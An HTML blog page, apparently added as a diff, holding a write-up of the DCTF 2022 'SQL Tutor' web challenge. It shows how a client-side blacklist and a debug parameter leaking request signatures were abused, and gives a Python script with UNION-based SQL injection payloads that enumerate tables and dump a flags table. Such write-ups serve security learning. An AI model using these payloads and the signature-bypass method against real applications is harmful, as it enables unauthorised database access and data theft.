@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>SQL Tutor challenge writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  <link href="//www.google-analytics.com" rel="dns-prefetch">
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve the SQL Tutor challenge, and it was worthy to share a writeup about it
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="SQL Tutor challenge writeup">
+    <meta name="twitter:description" content="DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve the SQL Tutor challenge, and it was worthy to share a writeup about it
+">
+    <meta name="twitter:image" content="/media/CTFs/Flag.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="SQL Tutor challenge writeup">
+  <meta property="og:description" content="DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve the SQL Tutor challenge, and it was worthy to share a writeup about it
+">
+  <meta property="og:url" content="/post/sql-tutor/">
+  <meta property="og:image" content="/media/CTFs/Flag.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/sql-tutor/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/grey-prism.svg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">SQL Tutor challenge writeup</h1>
+      <p class="post-meta">@0xMesbaha · Apr 17, 2022 · 4 min read</p>
+    </header>
+    <article class="post-content"><p>DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve the SQL Tutor challenge, and it was worthy to share a writeup about it</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CTF name</td>
+<td><a href="https://dctf.dragonsec.si/">DCTF 2022</a></td>
+</tr>
+<tr>
+<td>challenge</td>
+<td>SQL Tutor</td>
+</tr>
+<tr>
+<td>category</td>
+<td>web</td>
+</tr>
+<tr>
+<td>about</td>
+<td>SQL injection</td>
+</tr>
+<tr>
+<td>description</td>
+<td>I found this awesome site for learning SQL. Check it out!</td>
+</tr>
+<tr>
+<td>points</td>
+<td>200</td>
+</tr>
+<tr>
+<td>team</td>
+<td><a href="https://ctftime.org/team/168238">0xCha0s</a></td>
+</tr>
+<tr>
+<td>solved By</td>
+<td><a href="https://hussienmisbah.github.io/">0xMesbaha</a> and <a href="https://itsfading.github.io/">itsFading</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="discovery">Discovery</h2>
+<p>we are introduced with this page which execute fixed SQL statements and take one input to fill the <code>...</code> in the query</p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416155837.png" alt="image"></p>
+<p>However it wasn&rsquo;t that easy , there are some filters for special characters like <code>[ ' &quot; `] </code> and for some words like  <code>UNION</code></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416155856.png" alt="image"></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Intercepting the request with Burpsuite to see what is going on , we can see the following :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /verify_and_sign_text HTTP/1.1
+Host: sqltutor.dragonsec.si
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:78.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset<span style="color:#f92672">=</span>UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: <span style="color:#ae81ff">22</span>
+Origin: https://sqltutor.dragonsec.si
+Te: trailers
+Connection: close
+
+text<span style="color:#f92672">=</span>dGVzdG1l&amp;alg<span style="color:#f92672">=</span>sha1
+</code></pre></div><p>the text we sent has base64 encoded , and other argument is sent <code>alg</code> , sending this request to the repeater and view the response body we can see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;ok&#34;</span>,<span style="color:#f92672">&#34;trimmedText&#34;</span>:<span style="color:#e6db74">&#34;dGVzdG1l&#34;</span>,<span style="color:#f92672">&#34;signature&#34;</span>:<span style="color:#e6db74">&#34;f26039ef86a8c1218019b40e636d66ecfb45324a&#34;</span>,<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">null</span>}
+</code></pre></div><p>it return status ok , if we have changed the text being sent to a text contain one of the Blacklisted characters we will got another response body :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;error&#34;</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Dangerous strings:[ &#39; ] in text!&#34;</span>,<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">null</span>}
+</code></pre></div><p>Great , Forwarding the request , we can see another request is issued :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /execute HTTP/2
+Host: sqltutor.dragonsec.si
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:78.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset<span style="color:#f92672">=</span>UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: <span style="color:#ae81ff">74</span>
+Origin: https://sqltutor.dragonsec.si
+Te: trailers
+
+text<span style="color:#f92672">=</span>dGVzdG1l&amp;signature<span style="color:#f92672">=</span>f26039ef86a8c1218019b40e636d66ecfb45324a&amp;queryNo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</code></pre></div><p>and this request will be issued only if the first request passed returns <code>status:ok</code> , sending the latest request to the repeater to view the response we can see response body as :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;ok&#34;</span>,<span style="color:#f92672">&#34;query&#34;</span>:<span style="color:#e6db74">&#34;SELECT * FROM users WHERE users.name=&#39;testme&#39;&#34;</span>,<span style="color:#f92672">&#34;results&#34;</span>:[],<span style="color:#f92672">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;This query selects all users with the name &#39;testme&#39;.&#34;</span>,<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">null</span>}
+</code></pre></div><p>and we can see <code>&quot;debug:null&quot;</code> , we can try to add it as a parameter in the <code>/execute</code> request and will have the following results</p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416161431.png" alt="image"></p>
+<p>we know now the steps it passed through before the execution , so we know that :</p>
+<pre><code>2 requests are issued :
+1st one make sure the text doesn't contain a blacklisted element &quot;the check is at the client side&quot;
+2nd one will decode the text form base64 , verify the signature and then execute the query
+</code></pre><p>we can skip the first request easily and focus on the 2nd request , providing the <code>debug</code> parameter to know the tests we failed or passed</p>
+<p>if we try to change the base64 encoded text in the request the old signature will not work</p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416162046.png" alt="image"></p>
+<p>and thanks to the <code>debug</code> parameter we know what value should this signature be , so basically we need to issue the request 2 times one to get the valid signature and the other to send the payload associated with the valid signature</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>we can automate the process to save the time and for efficiency , Let&rsquo;s Build the script :</p>
+<ul>
+<li>sending the request for the 1st time to extract the signature value :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> base64
+
+
+url<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://sqltutor.dragonsec.si/execute&#34;</span>
+payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;testme &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+encoded<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>b64encode(payload)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+data <span style="color:#f92672">=</span> {
+<span style="color:#e6db74">&#34;text&#34;</span>:encoded,
+<span style="color:#e6db74">&#34;signature&#34;</span>:<span style="color:#e6db74">&#34;dummy&#34;</span>,
+<span style="color:#e6db74">&#34;queryNo&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,
+<span style="color:#e6db74">&#34;debug&#34;</span>:<span style="color:#e6db74">&#34;true&#34;</span>
+}
+
+r1<span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
+print(r1<span style="color:#f92672">.</span>text)
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416162632.png" alt="image"></p>
+<p>we will extract the signature value then update the signature parameter in the next request</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">resp<span style="color:#f92672">=</span>r1<span style="color:#f92672">.</span>text
+signature<span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;compare&#34;:&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">40</span>]
+
+data[<span style="color:#e6db74">&#34;signature&#34;</span>]<span style="color:#f92672">=</span>signature
+r2<span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
+print(r2<span style="color:#f92672">.</span>text)
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416162839.png" alt="image"></p>
+<p>Great the signature is okay and the query is executed , now we are ready to inject our text in the statement to be executed</p>
+<p>From the debug output the query is :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> users.name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span>
+</code></pre></div><p>we need to know number of columns first , update the payload variable :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; order by 8-- &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416163416.png" alt="image"></p>
+<p>keep fuzzing downwards until</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; order by 4-- &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416163440.png" alt="image"></p>
+<p>we know it has 4 columns , now let&rsquo;s enumerate the tables names :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; UNION SELECT 1,2,3,table_name FROM information_schema.tables--&#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</code></pre></div><p>and we got this huge output :</p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416163702.png" alt="image"></p>
+<p>Beautifying the output , we can notice the <code>flags</code> table :</p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416163812.png" alt="image"></p>
+<ul>
+<li>Let&rsquo;s update our payload :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; UNION SELECT 1,2,3,flag FROM flags-- &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416163929.png" alt="image"></p>
+<p>and finally the flag is here</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dctf<span style="color:#f92672">{</span>Pump_7h3_s7r3am_h4s5_up!_353aa965<span style="color:#f92672">}</span>
+</code></pre></div><p><img src="https://media.giphy.com/media/CyoQdbc7FHqqTpkSPI/giphy.gif" alt=""></p></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/sql-injection"><span class="tag">SQL Injection</span></a></li>
+        
+          <li><a href="/tags/python"><span class="tag">Python</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+  </body>
+</html>
